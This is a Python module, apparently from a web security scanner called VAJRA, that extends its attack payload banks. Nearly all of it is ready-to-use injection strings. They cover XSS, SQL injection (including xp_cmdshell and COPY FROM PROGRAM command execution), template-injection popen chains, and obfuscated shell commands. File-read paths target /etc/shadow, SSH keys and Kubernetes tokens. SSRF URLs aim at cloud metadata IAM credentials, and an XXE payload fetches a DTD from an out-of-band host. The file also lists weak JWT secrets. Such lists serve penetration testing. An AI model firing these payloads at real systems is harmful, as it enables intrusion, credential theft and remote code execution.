"""VAJRA payload arsenal extension - extends every core bank and adds
additional attack classes (SSRF, JWT, GraphQL, prototype pollution,
LDAP/XPath/header-injection/cache-poisoning)."""

# ------------------------------------------------------------------ XSS ----
_XSS_EXTRA = []
_more_tags = ["a", "b", "i", "u", "q", "s", "p", "div", "span", "h1", "h2",
              "h3", "li", "ul", "ol", "dt", "dd", "td", "th", "tr",
              "caption", "figure", "article", "section", "nav", "header",
              "footer", "address", "blockquote", "pre", "code", "kbd",
              "samp", "var", "cite", "abbr", "small", "sub", "sup", "time",
              "mark", "ins"]
_more_events = ["onbeforetoggle", "onbeforematch", "onscrollend",
                "onscroll", "onsecuritypolicyviolation", "ontransitionrun",
                "onloadstart", "onemptied", "oncanplay", "ondurationchange",
                "onvolumechange", "onsuspend", "onabort", "onblur",
                "onfocusin", "onhashchange", "onmessage", "onoffline",
                "ononline", "onpagehide", "onpopstate", "onresize",
                "onstorage", "onunload", "oncontextmenu", "ondblclick",
                "onkeydown", "onkeyup", "onmousedown", "onmouseenter",
                "onmouseleave", "onmousemove", "onmouseout", "onmouseup",
                "onplay", "onpause", "onprogress", "onratechange",
                "onseeked", "onstalled"]
for _t in _more_tags:
    for _e in _more_events:
        _XSS_EXTRA.append("<%s %s=alert(1)>" % (_t, _e))
_XSS_EXTRA += [
    "<svg><discard onbegin=alert(1)>",
    "<svg><animate attributeName=href values=javascript:alert(1)/>",
    "<svg><set attributeName=onmouseover to=alert(1)>",
    "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">",
    "<iframe srcdoc='<img src=x onerror=alert(1)>'>",
    "<iframe src='javascript:alert(1)'>",
    "<object data='data:text/html,<script>alert(1)</script>'>",
    "<form id=f></form><button form=f formaction=javascript:alert(1)>",
    "<math href='javascript:alert(1)'>CLICKME</math>",
    "<table background='javascript:alert(1)'>",
    "<link rel=stylesheet href='javascript:alert(1)'>",
    "<meta http-equiv=refresh content='0;javascript:alert(1)'>",
    "<frameset><frame src=javascript:alert(1)></frameset>",
    "<image src=x onerror=alert(1)>",
    "<body onscroll=alert(1)><br><input autofocus>",
    "<xss style='animation-name:x' onanimationstart=alert(1)>",
    "<xss id=x style='transition:color 1s' ontransitionend=alert(1)>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "'-alert(1)-'", "'-alert(1)//'",
    "<w contenteditable id=x onfocus=alert(1)>#x",
    "<x id=x tabindex=1 onactivate=alert(1)>#x",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)><option>a</option></select>",
    "<textarea autofocus onfocus=alert(1)></textarea>",
    "<keygen autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",
    "${constructor.constructor('alert(1)')()}",
]

# ----------------------------------------------------------------- SQLI ----
_SQLI_EXTRA = []
for _n in range(1, 11):
    _nulls = ",".join(["NULL"] * _n)
    _SQLI_EXTRA += [
        "' UNION SELECT %s-- -" % _nulls,
        "' UNION ALL SELECT %s#" % _nulls,
        "'/**/UNION/**/SELECT/**/%s/**/--" % _nulls.replace(",", ",/**/"),
    ]
_SQLI_DIALECT = [
    "' /*!50000UNION*/ /*!50000SELECT*/ NULL,version()-- -",
    "'/*!00000UNION*//*!00000SELECT*/NULL,user()#",
    "+UNION+ALL+SELECT+NULL,concat_ws(0x3a,user(),database())+--+",
    "'%20oR%201%3D1%23",
    "' AND extractvalue(rand(),concat(0x7e,version()))#",
    "' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))#",
    "(SELECT(CONCAT(0x7e,(SELECT version()),0x7e)))",
    "' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,database())),1)-- -",
    "';EXEC master..xp_cmdshell 'whoami'--",
    "' UNION SELECT NULL,@@version--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
    "';WAITFOR DELAY '0:0:6';--",
    "' OR 1 IN (SELECT @@servername)--",
    "'||UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))||'",
    "' UNION SELECT NULL,banner FROM v$version--",
    "'||CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version))||'",
    "';SELECT pg_read_file('/etc/passwd')--",
    "' AND 5618=CAST((SELECT current_database())::text AS NUMERIC)--",
    "';COPY files FROM PROGRAM 'id';--",
    "' UNION SELECT sql,tbl_name FROM sqlite_master--",
    "' || load_extension('x')||'",
]
_SQLI_EXTRA += _SQLI_DIALECT

# ------------------------------------------------------------------ LFI ----
_LFI_EXTRA = [
    "/proc/self/cmdline", "/proc/self/status", "/proc/self/mountinfo",
    "/proc/net/tcp", "/proc/version", "/etc/apache2/apache2.conf",
    "/etc/nginx/nginx.conf", "/etc/mysql/my.cnf",
    "/var/log/nginx/access.log", "/root/.bash_history",
    "/home/*/.ssh/id_rsa", "/etc/crontab", "/etc/shadow-", "/etc/gshadow",
    "/usr/local/tomcat/conf/tomcat-users.xml",
    "/etc/my.cnf", "/windows/system32/config/sam", "/windows/repair/sam",
    "/inetpub/wwwroot/web.config",
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/.dockerenv", "../../../../../../../../var/log/auth.log",
    "..\\..\\..\\..\\windows\\win.ini",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "....////....////....////etc/passwd",
    "php://filter/read=zlib.deflate/resource=/etc/passwd",
    "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "compress.zlib:///etc/passwd", "glob:///etc/*", "phar://../",
    "/etc/passwd\x00.txt", "/etc/passwd%00.jpg",
]
for _d in range(10, 21, 2):
    _LFI_EXTRA.append("../" * _d + "etc/passwd")

# ------------------------------------------------------------------ RCE ----
_RCE_OBFUSCATED = [
    "$(echo${IFS}aWQ=|base64${IFS}-d)",
    "echo${IFS}aWQ=|base64${IFS}-d|sh",
    "cat${IFS}/etc/passwd", "cat${IFS}/et?/pass??",
    "printf${IFS}'\\151\\144'|sh",
    "$(printf '\\165\\156\\141\\155\\145\\40\\55\\141')",
    "a|id|#", "a&id&#", "a&&id&&#", ";id#", "|id#", "&&id#",
    "%0aid%0a#", "$(id)#", "`id`#", "\\id", "id%00", "id%0Aid",
    "${PATH:0:1}", "${HOME:0:1}", "$(id -u):$(id -g)",
]

# ----------------------------------------------------------------- SSTI ----
_SSTI_EXTRA = [
    "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
    "{{ url_for.__globals__['__builtins__']['__import__']('os').popen('id').read() }}",
    "{{ cycler.next.__globals__.os.popen('id').read() }}",
    "{{ ''|attr('__class__')|attr('__base__')|attr('__subclasses__')() }}",
    "{{ 7*'7' if True else 0 }}",
    "${T(java.lang.Runtime).getRuntime().exec(\"id\")}",
    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
    "{{['id']|sort('system')}}",
    "{{app.request.query.get('vjr')}}",
    "{$smarty.version}",
    "#{java.lang.Runtime.getRuntime().exec('id')}",
    "<%= IO.popen('id').read %>", "{{ 7 | times: 7 }}",
    "{{ handler.settings }}", "{{ settings.SECRET_KEY }}",
]

# ---------------------------------------------------------------- NoSQL ----
_NOSQL_EXTRA = [
    '{"$where": "sleep(2000)"}',
    "[$ne]=null", "[$regex]=^a", "[$gt]=",
    "[$options]=i", "[$exists]=true",
    "admin[$ne]=1&pass[$ne]=1", "user[$regex]=^(a)&pass[$gt]= ",
    '{"username":"admin","password":{"$regex":"^a"}}',
    "' || this.username.match(/.*/)||'",
    "[$where]=function(){return this.username=='admin'}",
    '{"$unionWith": {"coll": "users"}}',
]

# ------------------------------------------------------------- Redirect ----
_REDIRECT_EXTRA = [
    "//vajra-oob.example/", "///vajra-oob.example/",
    "//vajra-oob.example?.a", "//vajra-oob.example#.a",
    "//vajra-oob.example/.a",
    "https://vajra-oob.example&x=1#@allowed.com",
    "//vajra-oob.example%2eexample.com",
    "https://allowed.com@vajra-oob.example",
    "//vajra-oob.example\\.allowed.com",
    "url=https://allowed.com.evil.com", "next=//vajra-oob.example",
    "goto=%2F%2Fvajra-oob.example", "returnUrl=//vajra-oob.example",
    "redirect_uri=//vajra-oob.example",
    "continue=https:/vajra-oob.example", "dest=//vajra-oob.example",
    "u=//vajra-oob.example", "forward=//vajra-oob.example",
    "jump=//vajra-oob.example", "to=//vajra-oob.example",
    "link=//vajra-oob.example", "exit=//vajra-oob.example",
    "logout=//vajra-oob.example", "callback=//vajra-oob.example",
]

# ----------------------------------------------------------------- CRLF ----
_CRLF_EXTRA = [
    "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a<script>alert(1)</script>",
    "%0d%0aSet-Cookie:vjr%3Dinjected%3B%20Path%3D/",
    "%0AInjected:%20yes",
    "%E5%98%8A%E5%98%8DSet-Cookie%3A%20vjr%3D1",
    "%0d%0aX-Cache-Poison:%20vjr",
    "%0d%0aLocation:%20//vajra-oob.example",
    "%250d%250aX-Double:%20vjr",
]

# ------------------------------------------------------------------ XXE ----
_XXE_EXTRA = [
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>',
    '<?xml version="1.0"?><!DOCTYPE r SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><r>&x;</r>',
    '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
    '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
    '<soap:Body><id>&xxe;</id></soap:Body></soap:Envelope>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "expect://id">]><r>&x;</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://vajra-oob.example/x.dtd">%remote;]><r/>',
]

# ---------------------------------------------------------------- LDAP ----
LDAP_BANK = [
    "*)(uid=*))(|(uid=*", "*)(objectClass=*", "*))%00", "*()|%26'", "*()|&'",
    "!(uid=*)", "*|(objectClass=*)", ")(&)", "*(|(mail=*)",
    ")(cn=*))(|(cn=*", "*)(sn=*", "&(cn=*)(!(cn=a)",
    "admin*)((|password=", "*)(&(password=*",
    "%2A%29%28uid%3D%2A", "x') or ('x'='x", "x' or 'a'='b",
]

# ---------------------------------------------------------------- XPath ----
XPATH_BANK = [
    "' or '1'='1", "'] | //user/*[position()=2] | /*['1'='2",
    "' or count(parent::*)>0 or '", "' or //user/name!='' or '",
    "1 or 1=1", "' or position()=1 or '", "x' or name(..)!='' or '",
    "'] | //*[contains(name,'pass')] | /*['", "'or node()='",
    "'] /child::node() | /*['",
    "' and string-length(password)>0 and '1'='1",
]

# ------------------------------------------------------- Header inject ----
HEADER_INJECTION_BANK = [
    "vjr.example%0d%0aX-Vajra:%20injected",
    "localhost%0d%0aX-Foo:%20bar",
    "%0d%0aSet-Cookie:%20session=vjr",
    "127.0.0.1%0d%0aHost:%20internal",
    "example.com%00.vjr.example",
    "vjr.example/@vajra-oob.example",
    "vjr.example?vajra-oob.example",
]

# --------------------------------------------------------- Cache poison ----
CACHE_POISON_PARAMS = [
    ("X-Forwarded-Host", "vjr-poison.example"),
    ("X-Forwarded-Scheme", "nohttps"),
    ("X-Original-URL", "/vjrpoison"),
    ("X-Rewrite-URL", "/vjrpoison"),
    ("X-Forwarded-Port", "1337"),
    ("X-Host", "vjr-poison.example"),
    ("Forwarded", "host=vjr-poison.example"),
]

# ------------------------------------------------------------ ProtoPoll ----
PROTOPOLL_BANK = [
    "__proto__[vjr]=1", "constructor[prototype][vjr]=1",
    "__proto__[admin]=true", "settings[__proto__][isAdmin]=1",
    '{"__proto__":{"vjr":1}}', '{"constructor":{"prototype":{"vjr":1}}}',
    "__proto__=vjr", "?__proto__[length]=1000",
]

# ---------------------------------------------------------------- SSRF ----
SSRF_BANK = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/computeMetadata/v1/instance/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.170.2/v2/credentials/",
    "file:///etc/passwd", "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_INFO%0d%0aquit",
    "gopher://127.0.0.1:25/xHELO vjr",
    "dict://127.0.0.1:11211/stat",
    "http://127.0.0.1:6379/INFO", "http://localhost:8500/v1/kv/?keys",
    "http://127.0.0.1:5984/_config", "http://127.0.0.1:9200/_cluster/health",
    "http://[::1]/", "http://0x7f000001/", "http://2130706433/",
    "http://127.1/", "http://0/", "https://127.0.0.1/",
    "//127.0.0.1:8080/", "http://127.0.0.1.nip.io",
    "http://vajra-oob.example@@127.0.0.1",
    "http://127.0.0.1@vajra-oob.example",
    "jar:http://vajra-oob.example!/x", "netdoc:///etc/passwd",
]
SSRF_MARKERS = {
    "ami-id": "AWS metadata reached",
    "instance-id": "cloud metadata reached",
    "computeMetadata": "GCP metadata reached",
    "root:x:": "file read via SSRF",
    "accessKey": "IAM credentials leaked",
}

# ----------------------------------------------------------------- JWT ----
JWT_WEAK_SECRETS = [
    "secret", "password", "jwt_secret", "changeme", "123456", "key",
    "supersecret", "your-256-bit-secret", "shhhh", "topsecret", "admin",
    "test", "dev", "qwerty", "letmein", "welcome", "abc123", "default",
    "token", "auth", "private", "hs256", "signing", "s3cr3t", "mysecret",
    "jwt", "example", "demo", "secret!", "P@ssw0rd", "0123456789abcdef",
]

JWT_NONE_TOKEN_TPL = "{h}.{p}."
